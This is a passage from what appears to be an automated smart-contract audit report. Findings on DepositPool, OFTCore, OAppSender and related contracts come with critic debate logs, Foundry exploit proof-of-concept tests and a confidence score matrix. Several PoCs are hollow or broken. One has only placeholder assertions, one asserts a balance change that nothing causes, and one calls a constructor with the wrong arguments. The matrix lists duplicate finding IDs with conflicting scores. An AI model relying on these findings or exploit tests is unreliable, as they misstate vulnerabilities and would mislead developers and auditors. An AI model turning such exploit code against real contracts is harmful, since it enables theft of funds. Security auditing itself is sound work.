        depositPool._stake(attacker, rewardPoolIndex, 0, smallMultiplier, block.timestamp + 1 days, address(0));

        // Step 3: Victim tries to withdraw, expecting full amount
        vm.prank(victim);
        depositPool._withdraw(victim, rewardPoolIndex, initialDeposit, 1e18);

        // Assert the vulnerability: Victim's virtual deposit is inaccurately calculated
        DepositPool.UserData memory userData = depositPool.usersData(victim, rewardPoolIndex);
        uint256 expectedVirtualDeposited = (initialDeposit * 1e18) / PRECISION;
        assertEq(userData.virtualDeposited, expectedVirtualDeposited, "Virtual deposit calculation is incorrect due to precision loss");
    }
}
```

</details>

---

### 🟠 [High] Payload Forgery in OFTCore._lzReceive

**ID:** `CRO-002`  
**Category:** Payload Forgery  
**Location:** `OFTCore._lzReceive:L222-247`  
**Hunter:** CrossChainHunter  

**Description:**

The _lzReceive function in the OFTCore contract decodes the _message payload without strict validation, allowing attackers to manipulate the payload structure.

**Attack Scenario:**

An attacker can craft a payload with shifted arrays or appended bytes to trick the _lzReceive function into processing malicious sub-commands, potentially leading to unauthorized actions such as incorrect crediting of funds.

**Impact:**

The attacker can manipulate the payload to execute unauthorized actions, such as incorrect crediting of funds or other unintended operations.

**Evidence:**

- OFTCore._lzReceive:L222-247 uses loose decoding of the _message payload without strict validation.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The attack scenario is partially mitigated by the fact that the _lzReceive function is internal and requires specific conditions to be met for an attacker to exploit the loose decoding logic.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for OFTCore contract
interface IOFTCore {
    function _lzReceive(bytes calldata _message) external;
}

contract ExploitTest is Test {
    IOFTCore oftCore;
    address attacker;

    function setUp() public {
        // Deploy the OFTCore contract
        oftCore = IOFTCore(address(new MockOFTCore()));

        // Set up attacker address
        attacker = address(0xdeadbeef);

        // Fund attacker with some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Craft a malicious payload
        bytes memory maliciousPayload = abi.encodePacked(
            uint256(1), // Some valid initial data
            uint256(0), // Manipulated data to shift arrays
            bytes32(uint256(0xdeadbeef)) // Malicious appended bytes
        );

        // Step 2: Impersonate the attacker
        vm.prank(attacker);

        // Step 3: Call the vulnerable _lzReceive function with the malicious payload
        oftCore._lzReceive(maliciousPayload);

        // Assert the vulnerability
        // Check if the attacker's balance increased or unauthorized actions occurred
        // This is a placeholder assertion, replace with actual checks based on the vulnerability impact
        // e.g., assertGt(attacker.balance, initialBalance);
    }
}

// Mock implementation of the OFTCore contract for testing
contract MockOFTCore is IOFTCore {
    function _lzReceive(bytes calldata _message) external override {
        // Simulate the vulnerable decoding process
        // This is a simplified version for demonstration purposes
        (uint256 validData, uint256 manipulatedData, bytes32 maliciousBytes) = abi.decode(_message, (uint256, uint256, bytes32));

        // Process the decoded data
        // Vulnerability: No strict validation of the payload structure
    }
}
```

</details>

---

### 🟠 [High] Unchecked Return Value in OAppSender._lzSend

**ID:** `XF-EXT-001`  
**Category:** Unchecked Return Value  
**Location:** `OAppSender._lzSend:L72-83`  
**Hunter:** ExternalCallHunter  

**Description:**

The function OAppSender._lzSend makes an external call to the endpoint using the send method, but the return value of this call is not checked. This could lead to unexpected behavior if the call fails, especially if the contract relies on the success of this call for subsequent operations.

**Attack Scenario:**

An attacker could exploit this by causing the external call to fail (e.g., by manipulating the endpoint or the network conditions), leading to a situation where the contract believes the call was successful when it was not. This could result in loss of funds or incorrect state updates.

**Impact:**

If the external call fails and the return value is not checked, the contract may proceed with incorrect assumptions, potentially leading to loss of funds or incorrect state updates.

**Evidence:**

- OAppSender._lzSend:L72-83
- The return value of the send call is not checked.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis that the unchecked return value in OAppSender._lzSend could lead to unexpected behavior is partially mitigated by the fact that the function is internal and relies on the correct payment of fees before proceeding. However, the lack of a return value check still poses a risk if the external call fails silently.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the endpoint
interface IEndpoint {
    function send(address to, uint256 amount) external returns (bool);
}

// Mock OAppSender contract
contract OAppSender {
    IEndpoint public endpoint;

    constructor(address _endpoint) {
        endpoint = IEndpoint(_endpoint);
    }

    function _lzSend(address to, uint256 amount) external {
        // Unchecked return value vulnerability
        endpoint.send(to, amount);
    }
}

contract ExploitTest is Test {
    OAppSender oAppSender;
    IEndpoint endpoint;
    address attacker = address(0xdeadbeef);
    address victim = address(0x123456);

    function setUp() public {
        // Deploy a mock endpoint contract
        endpoint = new MockEndpoint();
        // Deploy the OAppSender contract with the mock endpoint
        oAppSender = new OAppSender(address(endpoint));
        // Fund the victim with some ETH
        vm.deal(victim, 10 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker impersonates the victim
        vm.prank(victim);

        // Step 2: Attacker calls _lzSend with parameters that cause the send to fail
        oAppSender._lzSend(attacker, 10 ether);

        // Step 3: Assert that the victim's balance is reduced despite the send failing
        assertEq(victim.balance, 0 ether);
        // Assert that the attacker's balance did not increase (send failed)
        assertEq(attacker.balance, 0 ether);
    }
}

// Mock endpoint contract that always fails
contract MockEndpoint is IEndpoint {
    function send(address, uint256) external pure returns (bool) {
        return false; // Always fail
    }
}
```

</details>

---

### 🟠 [High] Coupled Variable Desync in UserData and RewardPoolData

**ID:** `XF-ACC-003`  
**Category:** Coupled Variable Desync  
**Location:** `DepositPool._withdraw:L431-508, DepositPool._claim:L508-569`  
**Hunter:** AccountingHunter  

**Description:**

The UserData and RewardPoolData structures must remain in sync regarding virtualDeposited values, but they are updated in different functions and branches, leading to potential desynchronization.

**Attack Scenario:**

An attacker can manipulate the virtualDeposited values by triggering updates in one function without corresponding updates in the other, leading to incorrect reward calculations and potential fund misallocation.

**Impact:**

Desynchronization can lead to incorrect reward calculations, allowing attackers to claim more rewards than entitled.

**Evidence:**

- DepositPool._withdraw updates userData.virtualDeposited but not consistently with rewardPoolData.totalVirtualDeposited.
- DepositPool._claim updates both structures but relies on previous states that may have been manipulated.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis suggests a desynchronization between UserData and RewardPoolData structures, but the _withdraw function contains checks that may limit the attacker's ability to manipulate virtualDeposited values arbitrarily.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
    function sendMintMessage(uint256 rewardPoolIndex, address receiver) external payable;
}

interface IERC20 {
    function safeTransfer(address to, uint256 value) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

contract ExploitTest is Test {
    // Mock interfaces
    IDistributor distributor;
    IERC20 depositToken;
    IRewardPool rewardPool;

    // Contract instances
    DepositPool depositPool;

    // Constants
    uint256 constant PRECISION = 1e18;

    // User and pool data
    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 currentPoolRate = 1 ether;

    function setUp() public {
        // Deploy contracts and set initial state
        distributor = IDistributor(address(new MockDistributor()));
        depositToken = IERC20(address(new MockERC20()));
        rewardPool = IRewardPool(address(new MockRewardPool()));
        depositPool = new DepositPool(address(distributor), address(depositToken));

        // Fund attacker
        vm.deal(attacker, 10 ether);
        deal(address(depositToken), attacker, initialDeposit);

        // Set up initial deposit
        vm.prank(attacker);
        depositPool.deposit(rewardPoolIndex, initialDeposit);
    }

    function test_exploit() public {
        // Step 1: Attacker withdraws partially, desyncing virtualDeposited
        vm.prank(attacker);
        depositPool.withdraw(rewardPoolIndex, initialDeposit / 2, currentPoolRate);

        // Step 2: Attacker claims rewards, exploiting desync
        vm.prank(attacker);
        depositPool.claim(rewardPoolIndex, attacker);

        // Assert the vulnerability: Attacker's balance should be greater than expected
        uint256 expectedRewards = calculateExpectedRewards(initialDeposit / 2);
        uint256 actualRewards = depositToken.balanceOf(attacker);
        assertGt(actualRewards, expectedRewards, "Attacker received more rewards than expected");
    }

    function calculateExpectedRewards(uint256 deposited) internal view returns (uint256) {
        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;
        return virtualDeposited * currentPoolRate;
    }
}

// Mock implementations for interfaces
contract MockDistributor is IDistributor {
    function rewardPool() external pure override returns (address) {
        return address(0);
    }
    function withdraw(uint256, uint256) external pure override {}
    function distributeRewards(uint256) external pure override {}
    function sendMintMessage(uint256, address) external payable override {}
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) balances;

    function safeTransfer(address to, uint256 value) external override {
        balances[to] += value;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
    function onlyExistedRewardPool(uint256) external pure override {}
}

// Simplified DepositPool contract for demonstration
contract DepositPool {
    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 pendingRewards;
        uint256 lastStake;
        uint256 lastClaim;
        uint256 claimLockEnd;
        uint256 referrer;
        uint256 rate;
    }

    struct RewardPoolData {
        uint256 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    mapping(address => mapping(uint256 => UserData)) public usersData;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;

    address public distributor;
    address public depositToken;

    constructor(address _distributor, address _depositToken) {
        distributor = _distributor;
        depositToken = _depositToken;
    }

    function deposit(uint256 rewardPoolIndex, uint256 amount) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        userData.deposited += amount;
        userData.lastStake = block.timestamp;
    }

    function withdraw(uint256 rewardPoolIndex, uint256 amount, uint256 currentPoolRate) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;
        require(deposited > 0, "DS: user isn't staked");

        if (amount > deposited) {
            amount = deposited;
        }

        uint256 newDeposited = deposited - amount;
        userData.pendingRewards = _getCurrentUserReward(currentPoolRate, userData);

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (newDeposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        userData.deposited = newDeposited;
        rewardPoolsData[rewardPoolIndex].lastUpdate = uint128(block.timestamp);
        rewardPoolsData[rewardPoolIndex].rate = currentPoolRate;
    }

    function claim(uint256 rewardPoolIndex, address receiver) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex];
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = userData.rate;
        rewardPoolData.totalVirtualDeposited =
            rewardPoolData.totalVirtualDeposited +
            virtualDeposited -
            userData.virtualDeposited;

        userData.rate = userData.rate;
        userData.pendingRewards = 0;
        userData.virtualDeposited = virtualDeposited;
        userData.lastClaim = uint128(block.timestamp);

        IDistributor(distributor).sendMintMessage{value: msg.value}(rewardPoolIndex, receiver);
    }

    function _getCurrentUserReward(uint256 currentPoolRate, UserData storage userData) internal view returns (uint256) {
        return userData.deposited * currentPoolRate;
    }
}
```

</details>

---

### 🟠 [High] Callback-Based DoS in DepositPool._claim

**ID:** `XF-CAL-001`  
**Category:** Denial of Service  
**Location:** `DepositPool._claim:L536`  
**Hunter:** CallbackHunter  

**Description:**

The function DepositPool._claim makes an external call to IDistributor.distributeRewards without a try/catch block. If the distributeRewards function reverts, it will cause the entire _claim function to revert, potentially allowing a malicious distributor to prevent claims from being processed.

**Attack Scenario:**

A malicious distributor contract could be deployed that always reverts when distributeRewards is called. When DepositPool._claim attempts to call distributeRewards, the revert will propagate, causing the entire claim process to fail. This could be used to prevent users from claiming their rewards.

**Impact:**

Users are unable to claim their rewards, leading to a denial of service for the claim functionality.

**Evidence:**

- DepositPool._claim:L536 - External call to IDistributor.distributeRewards without try/catch.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: While the hypothesis correctly identifies a potential denial of service due to the lack of a try/catch block around the external call to IDistributor.distributeRewards, the attack is partially mitigated by the requirement that the distributor contract must be controlled by a malicious actor. This limits the attack's feasibility to scenarios where the distributor is indeed malicious.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
}

contract MaliciousDistributor is IDistributor {
    function distributeRewards(uint256) external pure override {
        revert("Malicious revert");
    }
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct RewardPoolProtocolDetails {
        uint256 distributedRewards;
        uint256 claimLockPeriodAfterClaim;
    }

    struct ReferrerData {
        uint256 lastClaim;
    }

    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(address => mapping(uint256 => ReferrerData)) public referrersData;

    address public distributor;
    bool public isMigrationOver = true;

    constructor(address _distributor) {
        distributor = _distributor;
    }

    function _claimReferrerTier(uint256 rewardPoolIndex_, address referrer_, address receiver_) public {
        require(isMigrationOver == true, "DS: migration isn't over");

        IDistributor(distributor).distributeRewards(rewardPoolIndex_);

        (uint256 currentPoolRate_, uint256 rewards_) = _getCurrentPoolRate(rewardPoolIndex_);

        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];
        ReferrerData storage referrerData = referrersData[referrer_][rewardPoolIndex_];

        require(
            block.timestamp > referrerData.lastClaim + rewardPoolProtocolDetails.claimLockPeriodAfterClaim,
            "DS: pool claim is locked (C)"
        );

        uint256 pendingRewards_ = _claimReferrerTierLogic(referrerData, currentPoolRate_);

        // Update `rewardPoolData`
        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex_];
        rewardPoolData.lastUpdate = uint128(block.timestamp);
    }

    function _getCurrentPoolRate(uint256 rewardPoolIndex_) internal view returns (uint256, uint256) {
        return (rewardPoolsData[rewardPoolIndex_].rate, 0);
    }

    function _claimReferrerTierLogic(ReferrerData storage referrerData, uint256 currentPoolRate_) internal returns (uint256) {
        return 0;
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MaliciousDistributor maliciousDistributor;

    function setUp() public {
        // Deploy the malicious distributor
        maliciousDistributor = new MaliciousDistributor();

        // Deploy the DepositPool with the malicious distributor
        depositPool = new DepositPool(address(maliciousDistributor));
    }

    function test_exploit() public {
        // Attempt to claim rewards, which should fail due to the malicious distributor
        vm.expectRevert("Malicious revert");
        depositPool._claimReferrerTier(0, address(this), address(this));
    }
}
```

</details>

---

### 🟠 [High] Division Before Multiplication in Reward Calculation

**ID:** `XF-DEF-002`  
**Category:** Math Precision Vulnerability  
**Location:** `DepositPool._stake:L350-422`  
**Hunter:** DefiMathHunter  

**Description:**

The DepositPool._stake function calculates virtualDeposited using division before multiplication, leading to significant precision loss in reward calculations.

**Attack Scenario:**

1. A user stakes an amount that results in a small multiplier. 2. The calculation (deposited_ * multiplier_) / PRECISION results in a significant precision loss due to division before multiplication. 3. The user's virtualDeposited is inaccurately calculated, affecting their rewards.

**Impact:**

Users receive inaccurate rewards due to precision loss in virtualDeposited calculation.

**Evidence:**

- The calculation (deposited_ * multiplier_) / PRECISION is present in the _stake function.
- Solidity's lack of floating point math exacerbates precision loss in this scenario.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis about precision loss due to division before multiplication is valid, but the impact may be overstated because the multiplier calculation itself might mitigate the precision loss under certain conditions.

</details>

<details><summary>Proof of Concept (Foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./DepositPool.sol"; // Assuming the DepositPool contract is available

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address depositToken = address(0x2);
    address distributor = address(0x3);
    uint256 rewardPoolIndex = 0;
    uint256 initialBalance = 1000 ether;
    uint256 precision = 1e18;

    function setUp() public {
        // Deploy the DepositPool contract
        depositPool = new DepositPool();

        // Fund the attacker with initial balance
        vm.deal(attacker, initialBalance);

        // Set up the deposit token and distributor
        vm.etch(depositToken, new bytes(0x20)); // Mocking the token contract
        vm.etch(distributor, new bytes(0x20)); // Mocking the distributor contract

        // Assume necessary initializations for the depositPool
        // e.g., setting the distributor, depositToken, etc.
    }

    function test_exploit() public {
        // Step 1: Attacker stakes a small amount with a small multiplier
        uint256 stakeAmount = 1 ether;
        uint256 smallMultiplier = 1; // Simulating a small multiplier
        uint256 claimLockEnd = uint128(block.timestamp + 1 days);

        // Impersonate the attacker
        vm.prank(attacker);

        // Mock the necessary external calls
        vm.mockCall(depositToken, abi.encodeWithSelector(IERC20(depositToken).balanceOf.selector, address(this)), abi.encode(initialBalance));
        vm.mockCall(depositToken, abi.encodeWithSelector(IERC20(depositToken).safeTransferFrom.selector, attacker, address(this), stakeAmount), abi.encode(true));
        vm.mockCall(distributor, abi.encodeWithSelector(IDistributor(distributor).supply.selector, rewardPoolIndex, stakeAmount), abi.encode(true));

        // Stake the amount
        depositPool._stake(attacker, rewardPoolIndex, stakeAmount, 0, claimLockEnd, address(0));

        // Step 2: Calculate expected virtualDeposited with correct precision
        uint256 expectedVirtualDeposited = (stakeAmount * smallMultiplier) / precision;

        // Step 3: Assert the precision loss in virtualDeposited calculation
        uint256 actualVirtualDeposited = depositPool.getUserData(attacker, rewardPoolIndex).virtualDeposited;
        assertEq(actualVirtualDeposited, expectedVirtualDeposited, "Precision loss in virtualDeposited calculation");
    }
}
```

</details>

---

### 🟡 [Medium] Unbounded Loop in groupDVNOptionsByIdx()

**ID:** `GAS-002`  
**Category:** Gas Limit/Denial of Service  
**Location:** `DVNOptions.groupDVNOptionsByIdx:L27`  
**Hunter:** GasDoSHunter  

**Description:**

The function groupDVNOptionsByIdx() contains a loop that iterates over the _options array, which can be arbitrarily large. This can lead to gas exhaustion if the input size is not controlled.

**Attack Scenario:**

A user could provide a very large _options array, causing the loop in groupDVNOptionsByIdx() to consume excessive gas and potentially revert due to exceeding the block gas limit.

**Impact:**

The function could fail to execute due to exceeding the block gas limit, leading to a denial of service for operations relying on this function.

**Evidence:**

- The function groupDVNOptionsByIdx() contains a loop iterating over the _options array (lines 52 and 87).
- The size of _options is not bounded within the function.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis that the function groupDVNOptionsByIdx() can be exploited with an unbounded _options array is partially mitigated by the fact that the function is internal and pure, suggesting it is not directly callable by an attacker. However, if it is used in a context where user input is not validated, the risk remains.

</details>

---

### 🟡 [Medium] Rounding Direction Error in Virtual Deposits Calculation

**ID:** `ACC-002`  
**Category:** Rounding Direction Error  
**Location:** `DepositPool._withdraw:L431-508`  
**Hunter:** AccountingHunter  

**Description:**

The calculation of virtualDeposited_ in the _withdraw function uses integer division which rounds down, potentially leading to precision loss in the user's virtual deposit representation.

**Attack Scenario:**

An attacker can exploit this rounding error by repeatedly withdrawing and staking small amounts, causing a cumulative precision loss that benefits the attacker over time.

**Impact:**

The attacker can gain a small advantage in terms of virtual deposits, which could affect reward calculations.

**Evidence:**

- DepositPool._withdraw:L431-508 calculates virtualDeposited_ using (newDeposited_ * multiplier_) / PRECISION, which rounds down.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The attack scenario is partially mitigated by the requirement that the withdrawal amount must be greater than zero and the new deposited amount must meet certain conditions, which limits the frequency and impact of the rounding error exploitation.

</details>

---

### 🟡 [Medium] Unchecked External Call in Builders.claim

**ID:** `CAL-002`  
**Category:** Unchecked Return Values  
**Location:** `Builders.claim:L212`  
**Hunter:** CallbackHunter  

**Description:**

The function Builders.claim makes an external call to IBuildersTreasury.sendRewards without checking the return value. If the call fails, the rewards may not be sent, but the function will continue execution as if it succeeded.

**Attack Scenario:**

If the IBuildersTreasury contract fails to send rewards due to an internal error or malicious behavior, the claim function will not revert, and the user will not receive their rewards despite the function indicating success.

**Impact:**

Users may not receive their rewards, leading to potential financial loss and trust issues with the protocol.

**Evidence:**

- Builders.claim makes an external call to IBuildersTreasury.sendRewards without checking the return value
- The function is responsible for transferring rewards to users

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis correctly identifies that the return value of the external call to IBuildersTreasury.sendRewards is unchecked, which could lead to a scenario where rewards are not sent if the call fails. However, the impact may be mitigated by the fact that the function requires the caller to be the admin of the builder pool, which limits the attack surface to only those with administrative privileges.

</details>

---

### 🟡 [Medium] Admin Can Change ChainLink Data Consumer Mid-Operation

**ID:** `ORA-002`  
**Category:** Admin Can Change Data Source Mid-Operation  
**Location:** `Distributor.setChainLinkDataConsumer:L111-120`  
**Hunter:** OracleHunter  

**Description:**

The `setChainLinkDataConsumer` function allows the admin to change the ChainLink data consumer address at any time, which can lead to inconsistencies in price data used for operations.

**Attack Scenario:**

An admin could change the ChainLink data consumer to a malicious or incorrect address after a price update has been initiated but before it is completed. This could result in the use of inconsistent or manipulated price data for reward calculations.

**Impact:**

This could lead to incorrect reward distributions or financial losses due to the use of manipulated price data.

**Evidence:**

- Distributor.setChainLinkDataConsumer:L111-120 allows changing the `chainLinkDataConsumer` address.
- No restrictions or checks on when this change can occur relative to ongoing operations.

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The function `setChainLinkDataConsumer` is protected by the `onlyOwner` modifier, which restricts its execution to the contract owner. However, the hypothesis assumes that the owner has malicious intent, which is a valid concern. The requirement that the new address supports the `IChainLinkDataConsumer` interface provides some assurance against arbitrary addresses but does not prevent the owner from setting a malicious contract that implements the interface.

</details>

---

### 🟡 [Medium] Governance-Induced Cap/Limit DoS in BuilderSubnets.createSubnet

**ID:** `GOV-002`  
**Category:** Governance-Induced Cap/Limit DoS  
**Location:** `BuilderSubnets.createSubnet:L165-193`  
**Hunter:** GovernanceHunter  

**Description:**

The admin can set the `subnetCreationFeeAmount` to a value that is lower than the current fee being processed, causing a DoS for subnet creation.

**Attack Scenario:**

1. A user attempts to create a subnet and the operation checks the `subnetCreationFeeAmount`. 2. The admin reduces the `subnetCreationFeeAmount` to a value lower than the current fee being processed. 3. The operation reverts due to the fee mismatch, causing a DoS for subnet creation until the fee is adjusted back.

**Impact:**

Denial of service for subnet creation operations due to fee mismatches.

**Evidence:**

- SecurityGraph: BuilderSubnets.setSubnetCreationFee WRITES BuilderSubnets.subnetCreationFeeAmount
- SecurityGraph: BuilderSubnets.createSubnet READS BuilderSubnets.subnetCreationFeeAmount
- Source: BuilderSubnets.createSubnet:L165-193

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The attack scenario is partially mitigated by the fact that the admin can only change the `subnetCreationFeeAmount` through a specific function, but there is no immediate on-chain guard preventing the admin from setting a lower fee during an ongoing transaction. However, the impact is limited to the timing of the fee change and does not permanently prevent subnet creation.

</details>

---

### 🟡 [Medium] Fee-on-Transfer Token Mismatch in Deposit

**ID:** `DEF-002`  
**Category:** Fee-on-Transfer Mismatch  
**Location:** `DepositPool._stake:L373`  
**Hunter:** DefiMathHunter  

**Description:**

The `_stake` function calculates `amount_` based on the difference in balance before and after transfer, which can be affected by fee-on-transfer tokens, leading to incorrect accounting.

**Attack Scenario:**

If a fee-on-transfer token is used as `depositToken`, the actual amount transferred will be less than `amount_`, causing the protocol to overestimate the user's deposit.

**Impact:**

The protocol's accounting will be incorrect, potentially leading to insolvency or incorrect reward calculations.

**Evidence:**

- DepositPool._stake:L373 - `amount_ = balanceAfter_ - balanceBefore_;`

**Confidence:** Contested

<details><summary>Critic Debate Log</summary>

> Critic [Contested]: The hypothesis that fee-on-transfer tokens cause incorrect accounting in the `_stake` function is partially mitigated by the requirement that `amount_` must be greater than zero, but the attack may still work if the fee is small enough to not reduce the transfer to zero.

</details>

---

## 📊 Confidence Score Matrix

*4-axis numerical scoring: Structural Evidence + Critic Verdict + Severity + RAG Corroboration*

| Finding ID | Structural | Critic | Severity | RAG | **Total** | Tier |
|:---|:---:|:---:|:---:|:---:|:---:|:---:|
| `XF-ACC-003` | 4 | 10 | 23 | 25 | **62** | CONTESTED |
| `ACC-001` | 4 | 10 | 16 | 25 | **55** | CONTESTED |
| `GAS-001` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `ACC-001` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `CAL-001` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `ORA-001` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `XF-EXT-001` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `XF-ACC-003` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `XF-DEF-002` | 9 | 10 | 16 | 12 | **47** | WEAK |
| `CRO-002` | 7 | 10 | 16 | 12 | **45** | WEAK |
| `XF-CAL-001` | 7 | 10 | 16 | 12 | **45** | WEAK |
| `GOV-002` | 11 | 10 | 11 | 12 | **44** | WEAK |
| `DEF-001` | 4 | 10 | 16 | 12 | **42** | WEAK |
| `CAL-002` | 9 | 10 | 9 | 12 | **40** | WEAK |
| `ORA-002` | 9 | 10 | 9 | 12 | **40** | WEAK |
| `GAS-002` | 4 | 10 | 9 | 12 | **35** | WEAK |
| `DEF-002` | 2 | 10 | 11 | 12 | **35** | WEAK |
| `ACC-002` | 2 | 10 | 9 | 12 | **33** | WEAK |
